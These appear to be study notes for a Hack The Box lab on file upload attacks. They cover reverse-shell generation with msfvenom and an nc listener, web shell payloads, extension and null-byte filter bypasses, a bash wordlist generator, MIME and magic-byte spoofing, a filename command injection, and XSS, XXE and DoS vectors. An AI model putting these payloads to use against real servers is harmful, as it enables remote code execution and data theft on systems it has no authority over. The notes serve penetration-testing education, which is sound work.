# File upload attacks

\*The word lists used in these module to fuzz the extensions \*

```
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
```

One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.

For example, when we visit our exercise below, we see its URL as `http://SERVER_IP:PORT/`, as the `index` page is usually hidden by default. But, if we try visiting `http://SERVER_IP:PORT/index.php`, we would get the same page, which means that this is indeed a `PHP` web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using a [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.

Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com/) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application

\*\*These are the various tricks to reverse shell with PHP

| **Language / Framework** | **Common Script / Tool** | **How to Generate / Find**                                                           | **Best Use Case**                                                      |
| ------------------------ | ------------------------ | ------------------------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| **PHP**                  | `pentestmonkey`          | `/opt/useful/seclists/Web-Shells/php-reverse-shell.php`                              | Most common for Linux-based web servers (Apache/Nginx).                |
| **PHP (Custom)**         | `msfvenom`               | `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > shell.php`                 | When you need a small, specific payload to bypass length restrictions. |
| **ASPX (.NET)**          | `msfvenom`               | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx` | Used for Windows IIS servers.                                          |
| **JSP (Java)**           | `msfvenom`               | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp`      | Used for Java-based servers like Apache Tomcat.                        |
| **WAR (Java Arch.)**     | `msfvenom`               | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war`      | Used to deploy a full malicious archive on Tomcat/JBoss.               |
| **Python**               | `SecLists`               | `/opt/useful/seclists/Web-Shells/Python/python-reverse-shell.py`                     | If the server is running a Python-based framework (Flask/Django).      |
| **Node.js**              | `Custom JS`              | Available in `SecLists/Web-Shells`                                                   | Used for modern JavaScript-based back-ends.                            |

**Quick Execution Guide**

To use any of the shells listed above, you must follow these three steps:

**1. Preparation**

Edit your chosen script and replace the placeholder values with your **PwnBox IP** and a **listening port** (e.g., `4444`).

* **PHP Example:** `$ip = '10.10.10.10'; $port = 4444;`

**2. The Listener**

Before you trigger the shell, you must have a listener waiting on your machine:

Bash

```
nc -lvnp 4444
```

**3. The Trigger**

* **Upload** the file through the web application's upload feature.
* **Visit the link** of the uploaded file (e.g., `http://SERVER_IP:PORT/uploads/shell.php`).
* The page will "hang" or stay loading—this means the shell has executed, and you should check your terminal for the connection.

\*\*Path Discovery Methods

| **Method**            | **How to do it**                               | **Success Rate**           |
| --------------------- | ---------------------------------------------- | -------------------------- |
| **Source Inspection** | Look for `<img>` or `<a>` tags in the HTML.    | High (for images/profiles) |
| **Response Analysis** | Check Burp Suite for "Location" or JSON URLs.  | Medium                     |
| **Predictive Logic**  | Try `/uploads/`, `/images/`, or `/files/`.     | Medium                     |
| **Fuzzing**           | Use `gobuster` with a wordlist.                | High (takes time)          |
| **RCE Search**        | Use `find` if you already have command access. | **100% Guaranteed**        |

\*\*These is the one of the best method to bypass Blacklist Filters

| **Method**                       | **How to do it**                                                                                                                                                                         | **Success Rate**                       |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| **Source Inspection**            | Look for `<img>` or `<a>` tags in the HTML.                                                                                                                                              | High (for images/profiles)             |
| **Response Analysis**            | Check Burp Suite for "Location" or JSON URLs.                                                                                                                                            | Medium                                 |
| **Predictive Logic**             | Try `/uploads/`, `/images/`, or `/files/`.                                                                                                                                               | Medium                                 |
| **Fuzzing**                      | Use `gobuster` with a wordlist.                                                                                                                                                          | High (takes time)                      |
| **RCE Search**                   | Use `find` if you already have command access.                                                                                                                                           | **100% Guaranteed**                    |
| **Phase**                        | **Description**                                                                                                                                                                          | **Key Technique / Tool**               |
| **The Concept**                  | Unlike whitelists (which allow only specific types), blacklists block only what is "known to be bad." If a list is incomplete, an attacker can use an unlisted but executable extension. | **Back-end Validation Analysis**       |
| **Weakness 1: Incompleteness**   | Developers often block `.php` or `.php7`, but forget others like `.phtml`, `.phar`, `.php5`, or `.pgif`.                                                                                 | **Alternative Extensions**             |
| **Weakness 2: Case Sensitivity** | Some filters only check for lowercase. On Windows-based servers, `.pHp` or `.PhP` might bypass the filter but still execute as PHP code.                                                 | **Case Manipulation**                  |
| **Discovery**                    | Using a wordlist to test every possible extension to see which one the server accepts (indicated by a successful "200 OK" or a specific response length).                                | **Fuzzing with Burp Intruder**         |
| **Payload Preparation**          | Once a "hole" in the blacklist is found (e.g., `.phtml`), the malicious script is renamed and uploaded with a web shell payload.                                                         | **Web Shell (`system($_GET['cmd'])`)** |
| **Execution**                    | Navigating to the uploaded file's path (often found in `/uploads/` or `/profile_images/`) and passing commands via URL parameters.                                                       | **RCE (Remote Code Execution)**        |

**Whitelists** (allowing only specific "good" extensions) are generally more secure than blacklists, but they can still be defeated if the validation logic is flawed or the server is misconfigured.

| **Method**                       | **The "Hole" (Vulnerability)**                                                                                          | **The Payload Example** | **Logic**                                                                                                        |
| -------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ----------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **1. Double Extensions**         | **Weak Regex:** The code checks if the filename _contains_ `.jpg` but doesn't check if it _ends_ with it.               | `shell.jpg.php`         | The filter sees `.jpg` and says "OK." The server sees it ends in `.php` and executes the code.                   |
| **2. Reverse Double Extensions** | **Server Misconfiguration:** Apache is told to execute any file _containing_ `.php` regardless of what it ends with.    | `shell.php.jpg`         | The filter sees it ends in `.jpg` (allowed). The Apache server sees `.php` in the middle and executes it anyway. |
| **3. Character Injection**       | **Encoding/Null Bytes:** Tricking the server into "stopping" the filename reading before it reaches the real extension. | `shell.php%00.jpg`      | The `%00` (Null Byte) tells older versions of PHP to stop reading, so it saves the file as `shell.php`.          |

* **Null Byte (`%00`):** Works on PHP 5.X and below. It effectively "terminates" the string in the eyes of the file system while passing the regex check.
* **Windows Colons (`:`):** Injecting a colon like `shell.aspx:.jpg` can sometimes trick a Windows server into ignoring the `.jpg` part.
* **Newline/Space (`%0a` / `%20`):** Sometimes adding a trailing space or newline causes the regex to fail while the file system trims it and saves it as a valid script.

\*\*Character Injection

Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

The following are some of the characters we may try injecting:

* `%20`
* `%0a`
* `%00`
* `%0d0a`
* `/`
* `.\`
* `.`
* `…`
* `:`

_The Bash script is a **Permutation Generator**. Its job is to create every possible combination of a "safe" extension (`.jpg`) and a "malicious" extension (`.php`) using various "glue" characters. This is the shotgun approach to finding a specific hole in a server's defense._

* The Security Guard (WAF/Regex): It looks at `shell.php%00.jpg`. It sees `.jpg` at the end and says, "This is an image, let it in."
* The Architect (PHP/App Logic): It might try to sanitize the name or move it.
* The Ground Crew (Operating System/File System): When Linux or Windows goes to write the file to the disk, it sees `%00` (a Null Byte) and stops reading immediately. It saves the file as `shell.php`, completely ignoring the `.jpg` that the security guard saw.
* The "When": This works when the **Web Server (Apache/Nginx)** is misconfigured to look _inside_ the filename rather than just at the end.
* The Reason: If the Apache config uses `<FilesMatch ".+\.ph.*">`, it tells the server: "If you see `.ph` anywhere in the name, treat it as a PHP script." It doesn't care that it ends in `.jpg`.

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

_Some times when we upload these file `shell%20.phar.jpg` the web application saves these same but the server think's it is a space in the URL encoded that why we want to try the double encoding technique `shell%2520.phar.jpg` like these_

| **Payload**               | **Technique**             | **Why it works**                                                                         |
| ------------------------- | ------------------------- | ---------------------------------------------------------------------------------------- |
| **`shell%20.phar.jpg`**   | **Normalization**         | The OS or Server might ignore/trim the space and "see" the executable extension instead. |
| **`shell%2520.phar.jpg`** | **Double Encoding**       | Bypasses filters/WAFs that only decode the input once.                                   |
| **`.phar`**               | **Alternative Extension** | Bypasses blacklists that are only looking for the literal string `.php`.                 |

**Content-Type Header Manipulation**

The `Content-Type` header is sent by your browser to tell the server what kind of file it's receiving. Because the _client_ (you) controls this header, it is trivial to fake.

* **The Scenario:** You upload `shell.php`. Your browser sends `Content-Type: application/x-php`. The server rejects it.
* **The Fix:**
  1. Intercept the upload request in **Burp Suite**.
  2. Locate the `Content-Type` header associated with the file part (at the bottom of the request).
  3. Change `application/x-php` to a whitelisted type like **`image/jpeg`**, **`image/png`**, or **`image/gif`**.
  4. Forward the request.

***

**Magic Bytes (MIME-Type) Injection**

Modern servers often ignore the header and look at the first few bytes of the file itself to determine its "MIME-Type." These are called **Magic Bytes**.

* **The Scenario:** The server uses a function like `mime_content_type()` to read the file. Even if you name it `pic.jpg`, if it starts with `<?php`, the server knows it’s a text/script file.
* **The Fix:** Add the "signatures" of a real image to the very top of your PHP script. The easiest to use is the **GIF signature** because it is plain text.

_To bypass these we need to add the GIF8 in the front or top of the payload_

| **Target Image Type** | **Magic Bytes (Hex)** | **Plain Text Equivalent**     |
| --------------------- | --------------------- | ----------------------------- |
| **GIF**               | `47 49 46 38 39 61`   | **`GIF89a`** (or just `GIF8`) |
| **JPEG**              | `FF D8 FF E0`         | (Non-printable)               |
| **PNG**               | `89 50 4E 47`         | (Non-printable)               |

Even when an application strictly limits what you can upload (e.g., "only images allowed"), it is still possible to compromise the server or its users. This section of the HTB module breaks these down into three primary attack categories: **XSS**, **XXE**, and **DoS**.

***

**1. XSS (Cross-Site Scripting)**

XSS in file uploads targets the **client** (the person viewing the file) rather than the server itself.

* **HTML Uploads:** If a site allows `.html` files, you can embed JavaScript. When an admin views your file, the script runs in their session.
* **SVG Images:** Since SVGs are XML-based, you can insert a `<script>` tag directly into the image. If the browser renders the SVG, it executes the code.
* **Metadata (EXIF):** You can use `exiftool` to hide a payload in the "Comment" or "Artist" field of a JPEG. If the web app displays that metadata on a profile page, the XSS triggers.

***

**2. XXE (XML External Entity)**

XXE targets the **server's filesystem** and internal network. It relies on the server using an insecure XML parser to "read" the uploaded file.

* **File Disclosure:** Using an SVG or XML file to define an "External Entity" that points to sensitive files like `/etc/passwd`.
* **Source Code Leakage:** Using **PHP Filters** (`php://filter/convert.base64-encode/resource=upload.php`) inside an SVG to steal the back-end code. This is exactly what you need for **Question 2** in your screenshot.
* **SSRF:** Forcing the server to make requests to internal APIs or other servers that aren't public-facing.

***

**3. DoS (Denial of Service)**

DoS attacks aim to **crash the server** or make the application unavailable by exhausting its resources (CPU, RAM, or Disk).

* **Decompression Bomb (Zip Bomb):** A tiny ZIP file that, when unzipped by the server, expands into Petabytes of data, filling the hard drive instantly.
* **Pixel Flood:** A small image file (like a 500x500 JPG) with a modified header that tells the server it is actually 4 Gigapixels. The server crashes trying to allocate enough RAM to "see" the image.
* **XXE DoS:** Also known as a "Billion Laughs" attack, where XML entities are nested inside each other until the parser runs out of memory.

| **Attack Category**         | **Primary Vector**                                     | **The "Why" (Logic)**                                                                                             | **The Goal**                                                  |
| --------------------------- | ------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| **1. Filename Injections**  | `file$(whoami).jpg`, `<script>alert(1)</script>.png`   | The server uses the filename in an OS command (like `mv`) or displays it on a page without cleaning it.           | **RCE**, **XSS**, or **SQL Injection**.                       |
| **2. Directory Disclosure** | Long filenames, simultaneous requests, reserved names. | Forcing the server to generate an error message that reveals the full internal file path.                         | Finding where files are stored to perform **LFI** or **XXE**. |
| **3. Windows-Specific**     | `CON`, `HAC~1.TXT`, `shell.php:.jpg`                   | Uses Windows-only features like reserved names or the "8.3 Filename Convention" to bypass logic.                  | Overwriting sensitive files or bypassing name filters.        |
| **4. Advanced Processing**  | Malicious `.avi` or `.zip` files.                      | Exploits vulnerabilities in libraries (like **ffmpeg**) that automatically process/convert the file after upload. | **XXE**, **RCE**, or system crashes (DoS).                    |
